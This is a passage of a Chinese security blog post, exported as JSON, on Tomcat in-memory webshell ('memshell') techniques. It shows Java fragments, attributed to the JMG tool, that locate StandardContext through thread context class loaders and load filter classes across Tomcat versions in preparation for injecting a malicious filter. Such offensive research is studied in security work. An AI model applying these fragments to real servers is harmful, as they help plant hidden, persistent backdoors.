#F97583\">if</span><span style=\"color: #B392F0\"> (context </span><span style=\"color: #F97583\">!=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">&amp;&amp;</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getClass()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getName()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">contains(</span><span style=\"color: #FFAB70\">&quot;StandardContext&quot;</span><span style=\"color: #B392F0\">)) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                </span><span style=\"color: #79B8FF\">contexts</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">add(context);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                            &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                            </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (context </span><span style=\"color: #F97583\">!=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">&amp;&amp;</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getClass()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getName()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">contains(</span><span style=\"color: #FFAB70\">&quot;TomcatEmbeddedContext&quot;</span><span style=\"color: #B392F0\">)) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                                </span><span style=\"color: #79B8FF\">contexts</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">add(context);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                            &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    &#125;</span></span></code></pre></div><h2 id=\"0x02-Tomcat9-之后的路\"><a href=\"#0x02-Tomcat9-之后的路\" class=\"headerlink\" title=\"0x02 Tomcat9 之后的路\"></a>0x02 Tomcat9 之后的路</h2><p>之后就是 Tomcat9 版本之后的内容，ContainerBackgroundProcessor（standardEngine） 无法通过遍历线程获取到了，但是此时我们有另一种方法，就是直接判断该线程的 ContextClassLoader 是否为<code>ParallelWebappClassLoader</code>或者<code>TomcatEmbeddedWebappClassLoader</code>，然后再根据老一套的 ContextClassLoader-&gt;ContextRoot-&gt;StandardContext 逻辑将 context 取出。这里其实还有一条路，就是通过Acceptor 的线程去拿 StandardContext。这个方法固然很好，但是问题在于，如果遇到了 Snakeyaml 的 ScriptEngineManager 中指定的 ClassLoader 是 URLClassLoder，就加载不到一些重要的类，所以我们很有必要获取到一个能够完成绝大部分类加载的 ClassLoader，<code>ParallelWebappClassLoader``TomcatEmbeddedWebappClassLoader</code>都是这样的 Loader，并且他们还能拿到 Context<br>JMG 中的具体的代码如下:</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">else</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">thread</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getContextClassLoader() </span><span style=\"color: #F97583\">!=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">&amp;&amp;</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">thread</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getContextClassLoader()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getClass()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">toString()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">contains(</span><span style=\"color: #FFAB70\">&quot;ParallelWebappClassLoader&quot;</span><span style=\"color: #B392F0\">) </span><span style=\"color: #F97583\">||</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">thread</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getContextClassLoader()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getClass()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">toString()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">contains(</span><span style=\"color: #FFAB70\">&quot;TomcatEmbeddedWebappClassLoader&quot;</span><span style=\"color: #B392F0\">))) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    context </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> getFV(getFV(</span><span style=\"color: #79B8FF\">thread</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getContextClassLoader()</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;resources&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;context&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (context </span><span style=\"color: #F97583\">!=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">&amp;&amp;</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getClass()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getName()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">contains(</span><span style=\"color: #FFAB70\">&quot;StandardContext&quot;</span><span style=\"color: #B392F0\">)) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        </span><span style=\"color: #79B8FF\">contexts</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">add(context);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (context </span><span style=\"color: #F97583\">!=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">&amp;&amp;</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getClass()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getName()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">contains(</span><span style=\"color: #FFAB70\">&quot;TomcatEmbeddedContext&quot;</span><span style=\"color: #B392F0\">)) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        </span><span style=\"color: #79B8FF\">contexts</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">add(context);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                &#125;</span></span></code></pre></div><p>之后还需要注意的一点就是 Class.forName 加载 Tomcat 类的时候，一定要指定 ClassLoader。</p>\n<h1 id=\"tomcat-版本不同中关键组件的获取\"><a href=\"#tomcat-版本不同中关键组件的获取\" class=\"headerlink\" title=\"tomcat 版本不同中关键组件的获取\"></a>tomcat 版本不同中关键组件的获取</h1><p>具体的实现代码如下</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">ClassLoader</span><span style=\"color: #B392F0\"> catalinaLoader </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">this</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getCatalinaLoader();</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">try</span><span style=\"color: #B392F0\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">this</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">classLoader</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">==</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\">) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #79B8FF\">this</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">classLoader</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Thread</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">currentThread()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getContextClassLoader();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            filterDef </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">true</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">this</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">classLoader</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">newInstance();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            filterMap </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">true</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">this</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">classLoader</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">newInstance();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#125; </span><span style=\"color: #F97583\">catch</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #F97583\">Exception</span><span style=\"color: #B392F0\"> var19) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">try</span><span style=\"color: #B392F0\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                filterDef </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.catalina.deploy.FilterDef&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">true</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">this</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">classLoader</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">newInstance();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                filterMap </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.catalina.deploy.FilterMap&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">true</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">this</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">classLoader</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">newInstance();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &#125; </span><span style=\"color: #F97583\">catch</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #F97583\">Exception</span><span style=\"color: #B392F0\"> var18) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                filterDef </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.catalina.deploy.FilterDef&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">true</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> catalinaLoader)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">newInstance();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                filterMap </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.catalina.deploy.FilterMap&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">true</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> catalinaLoader)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">newInstance();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#125;</span></span></code></pre></div><p><code>org.apache.tomcat.util.descriptor.web</code>主要适用于 tomcat9 之后<br><code>org.apache.catalina.deploy</code>主要适用于 tomcat8 以及之前较老的版本<br>还有一些关键组件，因为版本不同，比如 <code>javax.servlet.Filter</code>和<code>jakarta.servlet.Filter</code>，具体就是 tomcat9 之前和 tomcat9 之后的 tomcat10 的版本不同，导致报名不同的问题，处理的逻辑如下：</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">Class</span><span style=\"color: #B392F0\"> clazz;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">try</span><span style=\"color: #B392F0\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        clazz </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;javax.servlet.Filter&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">true</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">this</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">classLoader</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125; </span><span style=\"color: #F97583\">catch</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #F97583\">Exception</span><span style=\"color: #B392F0\"> var16) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        clazz </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;jakarta.servlet.Filter&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">true</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">this</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">classLoader</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span></code></pre></div>","feature":true,"text":"之前学习的通过反序列化或者其他能够代码执行的内存马回显技术，在一定版本下以及一定实验环境下，已经足够好用。但是问题在于如果我们放到JDK11或更高版本，以及实战...","permalink":"/post/Memshell再研究","photos":[],"count_time":{"symbolsCount":"10k","symbolsTime":"9 mins."},"categories":[{"name":"锻刀的理论学习-Memshell2","slug":"锻刀的理论学习-Memshell2","count":1,"path":"api/categories/锻刀的理论学习-Memshell2.json"}],"tags":[{"name":"锻刀","slug":"锻刀","count":15,"path":"api/tags/锻刀.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E8%8E%B7%E5%8F%96StandardContext%E7%9A%84%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">获取StandardContext的思路总结</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E8%AF%A6%E8%A7%A3%E9%81%8D%E5%8E%86%E7%BA%BF%E7%A8%8B%E8%8E%B7%E5%8F%96StandardContext\"><span class=\"toc-text\">详解遍历线程获取StandardContext</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-ContainerBackgroundProcessor\"><span class=\"toc-text\">0x01 ContainerBackgroundProcessor</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-Tomcat9-%E4%B9%8B%E5%90%8E%E7%9A%84%E8%B7%AF\"><span class=\"toc-text\">0x02 Tomcat9 之后的路</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#tomcat-%E7%89%88%E6%9C%AC%E4%B8%8D%E5%90%8C%E4%B8%AD%E5%85%B3%E9%94%AE%E7%BB%84%E4%BB%B6%E7%9A%84%E8%8E%B7%E5%8F%96\"><span class=\"toc-text\">tomcat 版本不同中关键组件的获取</span></a></li></ol>","author":{"name":"stoocea","slug":"blog-author","avatar":"https://bu.dusays.com/2024/07/29/66a7ad417ef9e.png","link":"/","description":"time thick away","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{},"next_post":{"title":"Tomcat型内存马回显以及反序列化写入","uid":"f460ee0e4c486df5d5b7ea18c82dd5f0","slug":"内存马回显技术","date":"2024-07-28T13:50:51.000Z","updated":"2024-07-28T13:54:08.758Z","comments":true,"path":"api/articles/内存马回显技术.json","keywords":null,"cover":"https://bu.dusays.com/2024/07/28/66a64d7a6dde8.png","text":"背景引入多适用于对方机器不出网，无法弹 shell 的情况，用来获取命令执行的结果。如果是能够解析 JSP 的中间件就很好利用，落地一个 JSP 进行一个 Re...","permalink":"/post/内存马回显技术","photos":[],"count_time":{"symbolsCount":"36k","symbolsTime":"33 mins."},"categories":[{"name":"锻刀的理论学习-EchoMemshell","slug":"锻刀的理论学习-EchoMemshell","count":1,"path":"api/categories/锻刀的理论学习-EchoMemshell.json"}],"tags":[{"name":"锻刀","slug":"锻刀","count":15,"path":"api/tags/锻刀.json"}],"author":{"name":"stoocea","slug":"blog-author","avatar":"https://bu.dusays.com/2024/07/29/66a7ad417ef9e.png","link":"/","description":"time thick away","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}